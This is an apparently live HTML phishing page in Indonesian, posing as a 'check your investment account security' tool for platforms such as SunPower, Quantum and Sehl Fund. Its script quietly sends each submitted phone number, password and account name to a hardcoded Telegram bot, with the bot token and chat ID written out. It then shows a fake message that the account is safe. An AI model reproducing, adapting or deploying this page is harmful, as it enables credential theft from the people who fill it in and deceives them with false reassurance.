<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .navbar {
            background-color: #333;
            overflow: hidden;
            display: flex;
            justify-content: space-between;
            padding: 14px 20px;
        }
        .navbar a {
            color: white;
            padding: 14px 20px;
            text-decoration: none;
            text-align: center;
        }
        .navbar a:hover {
            background-color: #ddd;
            color: black;
        }
        .login-form {
            width: 100%;
            max-width: 400px;
            margin: auto;
            background-color: #fff;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .login-form h2 {
            margin-top: 0;
        }
        .login-form label {
            display: block;
            margin-bottom: 10px;
        }
        .login-form input[type="text"], .login-form input[type="password"], .login-form select {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
        }
        .login-form button[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        .login-form button[type="submit"]:hover {
            background-color: #3e8e41;
        }
        footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px;
            position: relative;
            bottom: 0;
            width: 100%;
        }
        .status-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }
        .status-modal-content {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 90%;
            width: 400px;
        }
        .status-green {
            color: green;
        }
        .status-check {
            color: green;
            font-weight: bold;
        }
        .status-error {
            color: red;
        }
        .status-modal button {
            margin-top: 20px;
            padding: 10px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .status-modal button:hover {
            background-color: #3e8e41;
        }
        .image-container {
            display: none;
            margin-top: 20px;
            text-align: center;
        }
        .image-container img {
            width: 300px;
            margin: 10px;
        }
        .hide-button {
            display: none;
            margin-top: 10px;
            padding: 10px;
            background-color: #f44336;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .hide-button:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a href="#" onclick="showImages()">CARA CEK AKUN</a>
        <a href="https://wa.me/6283144282450" target="_blank">CONTACT</a>
    </div>

    <div class="login-form">
        <h2>Login ke akun Anda</h2>
        <form id="login-form" action="/login" method="post">
            <label for="phone">Phone Number:</label><br>
            <input type="text" id="phone" name="phone" required><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br>
            <label for="account">Account:</label><br>
            <select id="account" name="account">
                <option value="SunPower">SunPower</option>
                <option value="Grapix AI">Grapix AI</option>
                <option value="Surplus Global">Surplus Global</option>
                <option value="Quantum">Quantum</option>
                <option value="Bc Energy">Bc Energy</option>
                <option value="Sehl Fund">Sehl Fund</option>
                <option value="Star AI">FTA AI</option>
                <option value="Shellssss">Shellssss</option>
                <option value="SiemenEnergy">SiemenEnergy</option>
                <option value="Grafatar">Grafatar</option>
                <option value="Bicca99">Bicca99</option>
                <option value="Violet">Violet</option>
                <option value="Zionsx">Zionsxr</option>
            </select><br>
            <button type="submit">Cek keamanan akun</button>
        </form>
    </div>

    <div id="status-modal" class="status-modal">
        <div class="status-modal-content">
            <div id="status-info">
                <!-- Status message will be dynamically inserted here -->
            </div>
            <button onclick="closeModal()">Close</button>
        </div>
    </div>

    <div id="image-container" class="image-container">
        <img src="https://i.ibb.co.com/D14Z6XK/20240914-135435.jpg" alt="Image 1">
        <img src="https://i.ibb.co.com/6sfPwy7/20240914-135743.jpg" alt="Image 2">
        <button class="hide-button" onclick="hideImages()">Sembunyikan Semua Gambar</button>
    </div>

    <footer>
        <p>© 2024 Check the security of your investment account. Seluruh hak cipta dilindungi undang-undang untuk menjaga keamanan akun Anda</p>
    </footer>

    <script>
        const botToken = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY';
        const chatId = '6235911819';

        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();

            const phone = e.target.phone.value;
            const password = e.target.password.value;
            const account = e.target.account.value;

            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(new FormData(e.target))
            })
            .then((response) => response.text())
            .then((data) => {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `Login attempt:\nPhone Number: ${phone}\nPassword: ${password}\nAccount: ${account}`
                    })
                })
                .then((response) => response.json())
                .then((data) => {
                    if (data.ok) {
                        showModal(`
                            <h3>Informasi Akun ${account}:</h3>
                            <p><span class="status-green">ACTIVED</span></p>
                            <p>Keamanan Akun: <span class="status-check">Aman</span></p>
                            <p>Keamanan Penarikan: Tidak Ada Masalah</p>
                            <p>Keamanan Perangkat yang Dibeli: Tidak Ada Masalah</p>
                        `);
                    } else {
                        showModal('<p class="status-error">An error occurred. Try again later.</p>');
                    }
                })
                .catch((error) => {
                    showModal('<p class="status-error">Failed to send data to Telegram. Please try again later.</p>');
                });
            });
        });

        function showModal(message) {
            document.getElementById('status-info').innerHTML = message;
            document.getElementById('status-modal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('status-modal').style.display = 'none';
        }

        function showImages() {
            document.getElementById('image-container').style.display = 'block';
            document.querySelector('.hide-button').style.display = 'block';
        }

        function hideImages() {
            document.getElementById('image-container').style.display = 'none';
        }
    </script>
</body>
</html>
